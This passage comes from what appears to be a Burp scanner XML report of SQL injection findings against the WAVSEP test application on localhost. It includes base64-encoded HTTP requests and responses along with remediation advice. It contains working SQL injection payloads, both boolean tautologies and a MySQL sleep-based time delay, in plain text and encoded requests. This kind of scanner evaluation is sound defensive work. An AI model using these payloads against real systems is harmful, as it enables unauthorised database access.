nVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0xOTA5OTY3MDklMjBvciUyMDYwMjUlM2QwNjAyNQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjMzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMQo8L1REPgo8VEQ+CldlbGNvbWUgdG8gdGhlIHdlYiBzaXRlCjwvVEQ+CjxURD4KdGV4dHZhbHVlCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0xNzkzMzg3MDQlMjBvciUyMDQxMzMlM2Q0MTM1]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjMzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjM0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6957053385010900992</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>95433147 or 5329=05329</b> and <b>77541425 or 5615=5620</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9MTAwMDA5NTQzMzE0NyUyMG9yJTIwNTMyOSUzZDA1MzI5]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjM0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9MTAwMDA3NzU0MTQyNSUyMG9yJTIwNTYxNSUzZDU2MjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjM0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjM0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5530452032169233408</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
